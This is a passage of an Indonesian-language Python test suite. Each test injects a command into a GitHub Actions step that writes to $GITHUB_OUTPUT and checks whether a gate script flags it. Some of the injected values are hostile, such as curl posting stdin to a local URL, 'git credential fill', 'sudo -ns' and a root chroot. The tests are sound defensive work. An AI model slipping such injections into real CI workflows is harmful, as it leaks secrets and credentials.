                baris_aksi150,
                baris_aksi150.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(more; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru150 != isi_aksi150, \
            "suntikan aksi150 tidak menembak"
        with open(berkas_aksi150, "w", encoding="utf-8") as f:
            f.write(isi_baru150)
        rc, out = jalan(submore,
                        [sys.executable, GERBANG, "--semua"])
        periksa("pager pada stdin pipa menguras: gerbang gagal (Audit 1072)", rc != 0)
        shutil.rmtree(submore, ignore_errors=True)

        sub151 = klon(tmp, "sub151")
        berkas_aksi151 = os.path.join(
            sub151, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi151, encoding="utf-8") as f:
            isi_aksi151 = f.read()
        baris_aksi151 = [b for b in isi_aksi151.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru151 = isi_aksi151.replace(
                baris_aksi151,
                baris_aksi151.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(comm -1 - berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru151 != isi_aksi151, \
            "suntikan aksi151 tidak menembak"
        with open(berkas_aksi151, "w", encoding="utf-8") as f:
            f.write(isi_baru151)
        rc, out = jalan(sub151,
                        [sys.executable, GERBANG, "--semua"])
        periksa("comm -1 bendera: gerbang gagal (Audit 1074)", rc != 0)
        shutil.rmtree(sub151, ignore_errors=True)

        sub152 = klon(tmp, "sub152")
        berkas_aksi152 = os.path.join(
            sub152, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi152, encoding="utf-8") as f:
            isi_aksi152 = f.read()
        baris_aksi152 = [b for b in isi_aksi152.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru152 = isi_aksi152.replace(
                baris_aksi152,
                baris_aksi152.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst -sha256 -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru152 != isi_aksi152, \
            "suntikan aksi152 tidak menembak"
        with open(berkas_aksi152, "w", encoding="utf-8") as f:
            f.write(isi_baru152)
        rc, out = jalan(sub152,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl dgst operand '-': gerbang gagal (Audit 1075)", rc != 0)
        shutil.rmtree(sub152, ignore_errors=True)

        sub153 = klon(tmp, "sub153")
        berkas_aksi153 = os.path.join(
            sub153, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi153, encoding="utf-8") as f:
            isi_aksi153 = f.read()
        baris_aksi153 = [b for b in isi_aksi153.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru153 = isi_aksi153.replace(
                baris_aksi153,
                baris_aksi153.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl sha256 -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru153 != isi_aksi153, \
            "suntikan aksi153 tidak menembak"
        with open(berkas_aksi153, "w", encoding="utf-8") as f:
            f.write(isi_baru153)
        rc, out = jalan(sub153,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl alias digest '-': gerbang gagal (Audit 1075)", rc != 0)
        shutil.rmtree(sub153, ignore_errors=True)

        sub154 = klon(tmp, "sub154")
        berkas_aksi154 = os.path.join(
            sub154, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi154, encoding="utf-8") as f:
            isi_aksi154 = f.read()
        baris_aksi154 = [b for b in isi_aksi154.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru154 = isi_aksi154.replace(
                baris_aksi154,
                baris_aksi154.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl enc -base64 -in -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru154 != isi_aksi154, \
            "suntikan aksi154 tidak menembak"
        with open(berkas_aksi154, "w", encoding="utf-8") as f:
            f.write(isi_baru154)
        rc, out = jalan(sub154,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl enc -in '-': gerbang gagal (Audit 1075)", rc != 0)
        shutil.rmtree(sub154, ignore_errors=True)

        sub155 = klon(tmp, "sub155")
        berkas_aksi155 = os.path.join(
            sub155, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi155, encoding="utf-8") as f:
            isi_aksi155 = f.read()
        baris_aksi155 = [b for b in isi_aksi155.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru155 = isi_aksi155.replace(
                baris_aksi155,
                baris_aksi155.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(openssl dgst -rand berkas -sha256; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru155 != isi_aksi155, \
            "suntikan aksi155 tidak menembak"
        with open(berkas_aksi155, "w", encoding="utf-8") as f:
            f.write(isi_baru155)
        rc, out = jalan(sub155,
                        [sys.executable, GERBANG, "--semua"])
        periksa("openssl -rand bernilai: gerbang gagal (Audit 1076)", rc != 0)
        shutil.rmtree(sub155, ignore_errors=True)

        sub156 = klon(tmp, "sub156")
        berkas_aksi156 = os.path.join(
            sub156, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi156, encoding="utf-8") as f:
            isi_aksi156 = f.read()
        baris_aksi156 = [b for b in isi_aksi156.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru156 = isi_aksi156.replace(
                baris_aksi156,
                baris_aksi156.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar tf -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru156 != isi_aksi156, \
            "suntikan aksi156 tidak menembak"
        with open(berkas_aksi156, "w", encoding="utf-8") as f:
            f.write(isi_baru156)
        rc, out = jalan(sub156,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar bundel gaya lama: gerbang gagal (Audit 1077)", rc != 0)
        shutil.rmtree(sub156, ignore_errors=True)

        sub157 = klon(tmp, "sub157")
        berkas_aksi157 = os.path.join(
            sub157, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi157, encoding="utf-8") as f:
            isi_aksi157 = f.read()
        baris_aksi157 = [b for b in isi_aksi157.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru157 = isi_aksi157.replace(
                baris_aksi157,
                baris_aksi157.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -tf-; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru157 != isi_aksi157, \
            "suntikan aksi157 tidak menembak"
        with open(berkas_aksi157, "w", encoding="utf-8") as f:
            f.write(isi_baru157)
        rc, out = jalan(sub157,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar nilai -f merekat: gerbang gagal (Audit 1077)", rc != 0)
        shutil.rmtree(sub157, ignore_errors=True)

        sub158 = klon(tmp, "sub158")
        berkas_aksi158 = os.path.join(
            sub158, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi158, encoding="utf-8") as f:
            isi_aksi158 = f.read()
        baris_aksi158 = [b for b in isi_aksi158.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru158 = isi_aksi158.replace(
                baris_aksi158,
                baris_aksi158.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -cf - berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru158 != isi_aksi158, \
            "suntikan aksi158 tidak menembak"
        with open(berkas_aksi158, "w", encoding="utf-8") as f:
            f.write(isi_baru158)
        rc, out = jalan(sub158,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tar mode buat '-f -' keluaran: gerbang lolos (Audit 1078)", rc == 0)
        shutil.rmtree(sub158, ignore_errors=True)

        sub159 = klon(tmp, "sub159")
        berkas_aksi159 = os.path.join(
            sub159, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi159, encoding="utf-8") as f:
            isi_aksi159 = f.read()
        baris_aksi159 = [b for b in isi_aksi159.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru159 = isi_aksi159.replace(
                baris_aksi159,
                baris_aksi159.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git hash-object --stdin-paths; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru159 != isi_aksi159, \
            "suntikan aksi159 tidak menembak"
        with open(berkas_aksi159, "w", encoding="utf-8") as f:
            f.write(isi_baru159)
        rc, out = jalan(sub159,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git hash-object --stdin-paths: gerbang gagal (Audit 1079)", rc != 0)
        shutil.rmtree(sub159, ignore_errors=True)

        sub160 = klon(tmp, "sub160")
        berkas_aksi160 = os.path.join(
            sub160, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi160, encoding="utf-8") as f:
            isi_aksi160 = f.read()
        baris_aksi160 = [b for b in isi_aksi160.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru160 = isi_aksi160.replace(
                baris_aksi160,
                baris_aksi160.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git credential fill; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru160 != isi_aksi160, \
            "suntikan aksi160 tidak menembak"
        with open(berkas_aksi160, "w", encoding="utf-8") as f:
            f.write(isi_baru160)
        rc, out = jalan(sub160,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git credential fill: gerbang gagal (Audit 1079)", rc != 0)
        shutil.rmtree(sub160, ignore_errors=True)

        sub161 = klon(tmp, "sub161")
        berkas_aksi161 = os.path.join(
            sub161, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi161, encoding="utf-8") as f:
            isi_aksi161 = f.read()
        baris_aksi161 = [b for b in isi_aksi161.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru161 = isi_aksi161.replace(
                baris_aksi161,
                baris_aksi161.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git mktree; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru161 != isi_aksi161, \
            "suntikan aksi161 tidak menembak"
        with open(berkas_aksi161, "w", encoding="utf-8") as f:
            f.write(isi_baru161)
        rc, out = jalan(sub161,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git mktree: gerbang gagal (Audit 1079)", rc != 0)
        shutil.rmtree(sub161, ignore_errors=True)

        sub162 = klon(tmp, "sub162")
        berkas_aksi162 = os.path.join(
            sub162, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi162, encoding="utf-8") as f:
            isi_aksi162 = f.read()
        baris_aksi162 = [b for b in isi_aksi162.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru162 = isi_aksi162.replace(
                baris_aksi162,
                baris_aksi162.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git commit -F -; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru162 != isi_aksi162, \
            "suntikan aksi162 tidak menembak"
        with open(berkas_aksi162, "w", encoding="utf-8") as f:
            f.write(isi_baru162)
        rc, out = jalan(sub162,
                        [sys.executable, GERBANG, "--semua"])
        periksa("git commit -F '-': gerbang gagal (Audit 1079)", rc != 0)
        shutil.rmtree(sub162, ignore_errors=True)

        sub163 = klon(tmp, "sub163")
        berkas_aksi163 = os.path.join(
            sub163, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi163, encoding="utf-8") as f:
            isi_aksi163 = f.read()
        baris_aksi163 = [b for b in isi_aksi163.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru163 = isi_aksi163.replace(
                baris_aksi163,
                baris_aksi163.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(pr +3; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru163 != isi_aksi163, \
            "suntikan aksi163 tidak menembak"
        with open(berkas_aksi163, "w", encoding="utf-8") as f:
            f.write(isi_baru163)
        rc, out = jalan(sub163,
                        [sys.executable, GERBANG, "--semua"])
        periksa("operand +N pr: gerbang gagal (Audit 1080)", rc != 0)
        shutil.rmtree(sub163, ignore_errors=True)

        sub164 = klon(tmp, "sub164")
        berkas_aksi164 = os.path.join(
            sub164, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi164, encoding="utf-8") as f:
            isi_aksi164 = f.read()
        baris_aksi164 = [b for b in isi_aksi164.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru164 = isi_aksi164.replace(
                baris_aksi164,
                baris_aksi164.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tail +2; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru164 != isi_aksi164, \
            "suntikan aksi164 tidak menembak"
        with open(berkas_aksi164, "w", encoding="utf-8") as f:
            f.write(isi_baru164)
        rc, out = jalan(sub164,
                        [sys.executable, GERBANG, "--semua"])
        periksa("operand +N tail: gerbang gagal (Audit 1080)", rc != 0)
        shutil.rmtree(sub164, ignore_errors=True)

        sub165 = klon(tmp, "sub165")
        berkas_aksi165 = os.path.join(
            sub165, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi165, encoding="utf-8") as f:
            isi_aksi165 = f.read()
        baris_aksi165 = [b for b in isi_aksi165.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru165 = isi_aksi165.replace(
                baris_aksi165,
                baris_aksi165.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sort +2; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru165 != isi_aksi165, \
            "suntikan aksi165 tidak menembak"
        with open(berkas_aksi165, "w", encoding="utf-8") as f:
            f.write(isi_baru165)
        rc, out = jalan(sub165,
                        [sys.executable, GERBANG, "--semua"])
        periksa("operand +N sort: gerbang gagal (Audit 1080)", rc != 0)
        shutil.rmtree(sub165, ignore_errors=True)

        sub166 = klon(tmp, "sub166")
        berkas_aksi166 = os.path.join(
            sub166, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi166, encoding="utf-8") as f:
            isi_aksi166 = f.read()
        baris_aksi166 = [b for b in isi_aksi166.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru166 = isi_aksi166.replace(
                baris_aksi166,
                baris_aksi166.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(python3 -i -c pass; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru166 != isi_aksi166, \
            "suntikan aksi166 tidak menembak"
        with open(berkas_aksi166, "w", encoding="utf-8") as f:
            f.write(isi_baru166)
        rc, out = jalan(sub166,
                        [sys.executable, GERBANG, "--semua"])
        periksa("python -i sesudah -c: gerbang gagal (Audit 1081)", rc != 0)
        shutil.rmtree(sub166, ignore_errors=True)

        sub167 = klon(tmp, "sub167")
        berkas_aksi167 = os.path.join(
            sub167, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi167, encoding="utf-8") as f:
            isi_aksi167 = f.read()
        baris_aksi167 = [b for b in isi_aksi167.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru167 = isi_aksi167.replace(
                baris_aksi167,
                baris_aksi167.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(bash -ec cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru167 != isi_aksi167, \
            "suntikan aksi167 tidak menembak"
        with open(berkas_aksi167, "w", encoding="utf-8") as f:
            f.write(isi_baru167)
        rc, out = jalan(sub167,
                        [sys.executable, GERBANG, "--semua"])
        periksa("bundel shell -ec: gerbang gagal (Audit 1082)", rc != 0)
        shutil.rmtree(sub167, ignore_errors=True)

        sub168 = klon(tmp, "sub168")
        berkas_aksi168 = os.path.join(
            sub168, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi168, encoding="utf-8") as f:
            isi_aksi168 = f.read()
        baris_aksi168 = [b for b in isi_aksi168.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru168 = isi_aksi168.replace(
                baris_aksi168,
                baris_aksi168.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(python3 -ic pass; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru168 != isi_aksi168, \
            "suntikan aksi168 tidak menembak"
        with open(berkas_aksi168, "w", encoding="utf-8") as f:
            f.write(isi_baru168)
        rc, out = jalan(sub168,
                        [sys.executable, GERBANG, "--semua"])
        periksa("bundel python -ic: gerbang gagal (Audit 1082)", rc != 0)
        shutil.rmtree(sub168, ignore_errors=True)

        sub169 = klon(tmp, "sub169")
        berkas_aksi169 = os.path.join(
            sub169, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi169, encoding="utf-8") as f:
            isi_aksi169 = f.read()
        baris_aksi169 = [b for b in isi_aksi169.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru169 = isi_aksi169.replace(
                baris_aksi169,
                baris_aksi169.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(sudo -ns; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru169 != isi_aksi169, \
            "suntikan aksi169 tidak menembak"
        with open(berkas_aksi169, "w", encoding="utf-8") as f:
            f.write(isi_baru169)
        rc, out = jalan(sub169,
                        [sys.executable, GERBANG, "--semua"])
        periksa("bundel sudo -ns: gerbang gagal (Audit 1082)", rc != 0)
        shutil.rmtree(sub169, ignore_errors=True)

        sub170 = klon(tmp, "sub170")
        berkas_aksi170 = os.path.join(
            sub170, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi170, encoding="utf-8") as f:
            isi_aksi170 = f.read()
        baris_aksi170 = [b for b in isi_aksi170.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru170 = isi_aksi170.replace(
                baris_aksi170,
                baris_aksi170.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(bash -s berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru170 != isi_aksi170, \
            "suntikan aksi170 tidak menembak"
        with open(berkas_aksi170, "w", encoding="utf-8") as f:
            f.write(isi_baru170)
        rc, out = jalan(sub170,
                        [sys.executable, GERBANG, "--semua"])
        periksa("shell -s operand $0: gerbang gagal (Audit 1083)", rc != 0)
        shutil.rmtree(sub170, ignore_errors=True)

        sub171 = klon(tmp, "sub171")
        berkas_aksi171 = os.path.join(
            sub171, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi171, encoding="utf-8") as f:
            isi_aksi171 = f.read()
        baris_aksi171 = [b for b in isi_aksi171.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru171 = isi_aksi171.replace(
                baris_aksi171,
                baris_aksi171.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(chroot --userspec root / cat; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru171 != isi_aksi171, \
            "suntikan aksi171 tidak menembak"
        with open(berkas_aksi171, "w", encoding="utf-8") as f:
            f.write(isi_baru171)
        rc, out = jalan(sub171,
                        [sys.executable, GERBANG, "--semua"])
        periksa("chroot tabel opsi: gerbang gagal (Audit 1084)", rc != 0)
        shutil.rmtree(sub171, ignore_errors=True)

        sub172 = klon(tmp, "sub172")
        berkas_aksi172 = os.path.join(
            sub172, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi172, encoding="utf-8") as f:
            isi_aksi172 = f.read()
        baris_aksi172 = [b for b in isi_aksi172.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru172 = isi_aksi172.replace(
                baris_aksi172,
                baris_aksi172.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(curl -d@- http://127.0.0.1:9/x; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru172 != isi_aksi172, \
            "suntikan aksi172 tidak menembak"
        with open(berkas_aksi172, "w", encoding="utf-8") as f:
            f.write(isi_baru172)
        rc, out = jalan(sub172,
                        [sys.executable, GERBANG, "--semua"])
        periksa("curl -d@- merekat: gerbang gagal (Audit 1085)", rc != 0)
        shutil.rmtree(sub172, ignore_errors=True)

        sub173 = klon(tmp, "sub173")
        berkas_aksi173 = os.path.join(
            sub173, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi173, encoding="utf-8") as f:
            isi_aksi173 = f.read()
        baris_aksi173 = [b for b in isi_aksi173.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru173 = isi_aksi173.replace(
                baris_aksi173,
                baris_aksi173.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(curl -F a=@- http://127.0.0.1:9/x; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru173 != isi_aksi173, \
            "suntikan aksi173 tidak menembak"
        with open(berkas_aksi173, "w", encoding="utf-8") as f:
            f.write(isi_baru173)
        rc, out = jalan(sub173,
                        [sys.executable, GERBANG, "--semua"])
        periksa("curl -F a=@-: gerbang gagal (Audit 1085)", rc != 0)
        shutil.rmtree(sub173, ignore_errors=True)

        sub174 = klon(tmp, "sub174")
        berkas_aksi174 = os.path.join(
            sub174, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi174, encoding="utf-8") as f:
            isi_aksi174 = f.read()
        baris_aksi174 = [b for b in isi_aksi174.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru174 = isi_aksi174.replace(
                baris_aksi174,
                baris_aksi174.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(curl --form a=@- http://127.0.0.1:9/x; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru174 != isi_aksi174, \
            "suntikan aksi174 tidak menembak"
        with open(berkas_aksi174, "w", encoding="utf-8") as f:
            f.write(isi_baru174)
        rc, out = jalan(sub174,
                        [sys.executable, GERBANG, "--semua"])
        periksa("curl --form a=@-: gerbang gagal (Audit 1085)", rc != 0)
        shutil.rmtree(sub174, ignore_errors=True)

        sub175 = klon(tmp, "sub175")
        berkas_aksi175 = os.path.join(
            sub175, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi175, encoding="utf-8") as f:
            isi_aksi175 = f.read()
        baris_aksi175 = [b for b in isi_aksi175.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru175 = isi_aksi175.replace(
                baris_aksi175,
                baris_aksi175.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(curl --data-urlencode name@- http://127.0.0.1:9/x; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru175 != isi_aksi175, \
            "suntikan aksi175 tidak menembak"
        with open(berkas_aksi175, "w", encoding="utf-8") as f:
            f.write(isi_baru175)
        rc, out = jalan(sub175,
                        [sys.executable, GERBANG, "--semua"])
        periksa("curl urlencode name@-: gerbang gagal (Audit 1085)", rc != 0)
        shutil.rmtree(sub175, ignore_errors=True)

        sub176 = klon(tmp, "sub176")
        berkas_aksi176 = os.path.join(
            sub176, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi176, encoding="utf-8") as f:
            isi_aksi176 = f.read()
        baris_aksi176 = [b for b in isi_aksi176.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru176 = isi_aksi176.replace(
                baris_aksi176,
                baris_aksi176.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(curl --data-raw - http://127.0.0.1:9/x; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru176 != isi_aksi176, \
            "suntikan aksi176 tidak menembak"
        with open(berkas_aksi176, "w", encoding="utf-8") as f:
            f.write(isi_baru176)
        rc, out = jalan(sub176,
                        [sys.executable, GERBANG, "--semua"])
        periksa("curl --data-raw '-' harfiah: gerbang lolos (Audit 1086)", rc == 0)
        shutil.rmtree(sub176, ignore_errors=True)

        sub177 = klon(tmp, "sub177")
        berkas_aksi177 = os.path.join(
            sub177, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi177, encoding="utf-8") as f:
            isi_aksi177 = f.read()
        baris_aksi177 = [b for b in isi_aksi177.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru177 = isi_aksi177.replace(
                baris_aksi177,
                baris_aksi177.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tr -d a b; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru177 != isi_aksi177, \
            "suntikan aksi177 tidak menembak"
        with open(berkas_aksi177, "w", encoding="utf-8") as f:
            f.write(isi_baru177)
        rc, out = jalan(sub177,
                        [sys.executable, GERBANG, "--semua"])
        periksa("tr -d dua himpunan galat: gerbang lolos (Audit 1087)", rc == 0)
        shutil.rmtree(sub177, ignore_errors=True)

        sub178 = klon(tmp, "sub178")
        berkas_aksi178 = os.path.join(
            sub178, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi178, encoding="utf-8") as f:
            isi_aksi178 = f.read()
        baris_aksi178 = [b for b in isi_aksi178.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru178 = isi_aksi178.replace(
                baris_aksi178,
                baris_aksi178.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(tar -tf - < berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru178 != isi_aksi178, \
            "suntikan aksi178 tidak menembak"
        with open(berkas_aksi178, "w", encoding="utf-8") as f:
            f.write(isi_baru178)
        rc, out = jalan(sub178,
                        [sys.executable, GERBANG, "--semua"])
        periksa("khusus buta redirect ekor tar: gerbang lolos (Audit 1088)", rc == 0)
        shutil.rmtree(sub178, ignore_errors=True)

        sub179 = klon(tmp, "sub179")
        berkas_aksi179 = os.path.join(
            sub179, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi179, encoding="utf-8") as f:
            isi_aksi179 = f.read()
        baris_aksi179 = [b for b in isi_aksi179.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru179 = isi_aksi179.replace(
                baris_aksi179,
                baris_aksi179.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(git hash-object --stdin < berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru179 != isi_aksi179, \
            "suntikan aksi179 tidak menembak"
        with open(berkas_aksi179, "w", encoding="utf-8") as f:
            f.write(isi_baru179)
        rc, out = jalan(sub179,
                        [sys.executable, GERBANG, "--semua"])
        periksa("khusus buta redirect ekor git: gerbang lolos (Audit 1088)", rc == 0)
        shutil.rmtree(sub179, ignore_errors=True)

        sub180 = klon(tmp, "sub180")
        berkas_aksi180 = os.path.join(
            sub180, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi180, encoding="utf-8") as f:
            isi_aksi180 = f.read()
        baris_aksi180 = [b for b in isi_aksi180.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru180 = isi_aksi180.replace(
                baris_aksi180,
                baris_aksi180.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(socat - /dev/null < berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru180 != isi_aksi180, \
            "suntikan aksi180 tidak menembak"
        with open(berkas_aksi180, "w", encoding="utf-8") as f:
            f.write(isi_baru180)
        rc, out = jalan(sub180,
                        [sys.executable, GERBANG, "--semua"])
        periksa("khusus buta redirect ekor socat: gerbang lolos (Audit 1088)", rc == 0)
        shutil.rmtree(sub180, ignore_errors=True)

        sub181 = klon(tmp, "sub181")
        berkas_aksi181 = os.path.join(
            sub181, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi181, encoding="utf-8") as f:
            isi_aksi181 = f.read()
        baris_aksi181 = [b for b in isi_aksi181.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru181 = isi_aksi181.replace(
                baris_aksi181,
                baris_aksi181.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(more berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru181 != isi_aksi181, \
            "suntikan aksi181 tidak menembak"
        with open(berkas_aksi181, "w", encoding="utf-8") as f:
            f.write(isi_baru181)
        rc, out = jalan(sub181,
                        [sys.executable, GERBANG, "--semua"])
        periksa("more beroperand tetap menguras: gerbang gagal (Audit 1089)", rc != 0)
        shutil.rmtree(sub181, ignore_errors=True)

        sub182 = klon(tmp, "sub182")
        berkas_aksi182 = os.path.join(
            sub182, ".github", "actions", "resolve-vw",
            "action.yml")
        with open(berkas_aksi182, encoding="utf-8") as f:
            isi_aksi182 = f.read()
        baris_aksi182 = [b for b in isi_aksi182.splitlines()
                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru182 = isi_aksi182.replace(
                baris_aksi182,
                baris_aksi182.replace(
                    '>> "$GITHUB_OUTPUT"',
                    "> >(python3 -m json.tool berkas; cat >> \"$GITHUB_OUTPUT\")"), 1)
        assert isi_baru182 != isi_aksi182, \
            "suntikan aksi182 tidak menembak"
        with open(berkas_aksi182, "w", encoding="utf-8") as f:
            f.write(isi_baru182)
        rc, out = jalan(sub182,
                        [sys.executable, GERBANG, "--semua"])
